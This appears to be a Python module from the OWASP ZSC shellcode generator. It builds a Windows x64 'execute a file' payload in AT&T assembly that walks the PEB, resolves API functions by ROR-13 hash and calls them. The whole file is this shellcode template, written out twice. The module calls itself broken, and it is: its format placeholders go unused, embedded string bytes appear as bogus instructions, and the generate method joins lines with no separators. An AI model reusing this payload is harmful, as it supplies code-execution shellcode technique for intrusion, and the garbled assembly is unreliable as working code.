# Broken module that doesn't use any thing from string format
"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import stack
from math import ceil
from owasp_zsc.new_cores import base_module


def exc(file_to_exec, file_name):
    return '''
sub    $0x20,%rsp
and    $0xfffffffffffffff0,%rsp
mov    %gs:0x60,%r12
mov    0x18(%r12),%r12
mov    0x20(%r12),%r12
mov    (%r12),%r12
mov    0x20(%r12),%r15
mov    (%r12),%r12
mov    0x20(%r12),%r12
mov    $0xe8afe98,%rdx
mov    %r12,%rcx
mov    %r12,%r12
callq  0x401067
jmp    0x401059
pop    %rcx
mov    $0x1,%edx
callq  *%rax
mov    $0x2d3fcd70,%edx
mov    %r15,%rcx
callq  0x401067
xor    %rcx,%rcx
callq  *%rax
callq  0x40103f
movslq 0x6c(%rcx),%esp
movslq (%rsi),%ebp
gs js  0x4010cb
add    %cl,-0x77(%rcx)
int    $0x67
mov    0x3c(%r13),%eax
mov    0x88(%r13d,%eax,1),%r14d
add    %r13d,%r14d
mov    0x18(%r14d),%r10d
mov    0x20(%r14d),%ebx
add    %r13d,%ebx
jecxz  0x4010ca
dec    %r10d
mov    (%ebx,%r10d,4),%esi
add    %r13d,%esi
xor    %edi,%edi
xor    %eax,%eax
cld
lodsb   %ds:(%rsi),%al
test   %al,%al
je     0x4010a7
ror    $0xd,%edi
add    %eax,%edi
jmp    0x40109b
cmp    %edx,%edi
jne    0x401088
mov    0x24(%r14d),%ebx
add    %r13d,%ebx
xor    %ecx,%ecx
mov    (%ebx,%r10d,2),%cx
mov    0x1c(%r14d),%ebx
add    %r13d,%ebx
mov    (%ebx,%ecx,4),%eax
add    %r13d,%eax
retq
add    %al,(%rax)
add    %al,(%rax)
'''.format(file_to_exec, hex(int(8 + 4 * (ceil(len(file_name) / float(4))))))


def run(data):
    file_to_exec = data[0]
    return exc(stack.generate(file_to_exec, "%rcx", "string"), file_to_exec)


class Module(base_module.BasePayload):
    file_dest = base_module.OptString("", "File dest")  # TODO improve descr

    def generate(self):
        payload = "sub    $0x20,%rsp"
        payload += "and    $0xfffffffffffffff0,%rsp"
        payload += "mov    %gs:0x60,%r12"
        payload += "mov    0x18(%r12),%r12"
        payload += "mov    0x20(%r12),%r12"
        payload += "mov    (%r12),%r12"
        payload += "mov    0x20(%r12),%r15"
        payload += "mov    (%r12),%r12"
        payload += "mov    0x20(%r12),%r12"
        payload += "mov    $0xe8afe98,%rdx"
        payload += "mov    %r12,%rcx"
        payload += "mov    %r12,%r12"
        payload += "callq  0x401067"
        payload += "jmp    0x401059"
        payload += "pop    %rcx"
        payload += "mov    $0x1,%edx"
        payload += "callq  *%rax"
        payload += "mov    $0x2d3fcd70,%edx"
        payload += "mov    %r15,%rcx"
        payload += "callq  0x401067"
        payload += "xor    %rcx,%rcx"
        payload += "callq  *%rax"
        payload += "callq  0x40103f"
        payload += "movslq 0x6c(%rcx),%esp"
        payload += "movslq (%rsi),%ebp"
        payload += "gs js  0x4010cb"
        payload += "add    %cl,-0x77(%rcx)"
        payload += "int    $0x67"
        payload += "mov    0x3c(%r13),%eax"
        payload += "mov    0x88(%r13d,%eax,1),%r14d"
        payload += "add    %r13d,%r14d"
        payload += "mov    0x18(%r14d),%r10d"
        payload += "mov    0x20(%r14d),%ebx"
        payload += "add    %r13d,%ebx"
        payload += "jecxz  0x4010ca"
        payload += "dec    %r10d"
        payload += "mov    (%ebx,%r10d,4),%esi"
        payload += "add    %r13d,%esi"
        payload += "xor    %edi,%edi"
        payload += "xor    %eax,%eax"
        payload += "cld"
        payload += "lodsb   %ds:(%rsi),%al"
        payload += "test   %al,%al"
        payload += "je     0x4010a7"
        payload += "ror    $0xd,%edi"
        payload += "add    %eax,%edi"
        payload += "jmp    0x40109b"
        payload += "cmp    %edx,%edi"
        payload += "jne    0x401088"
        payload += "mov    0x24(%r14d),%ebx"
        payload += "add    %r13d,%ebx"
        payload += "xor    %ecx,%ecx"
        payload += "mov    (%ebx,%r10d,2),%cx"
        payload += "mov    0x1c(%r14d),%ebx"
        payload += "add    %r13d,%ebx"
        payload += "mov    (%ebx,%ecx,4),%eax"
        payload += "add    %r13d,%eax"
        payload += "retq"
        payload += "add    %al,(%rax)"
        payload += "add    %al,(%rax)"

        return payload

    def run(self):
        print(self.generate())
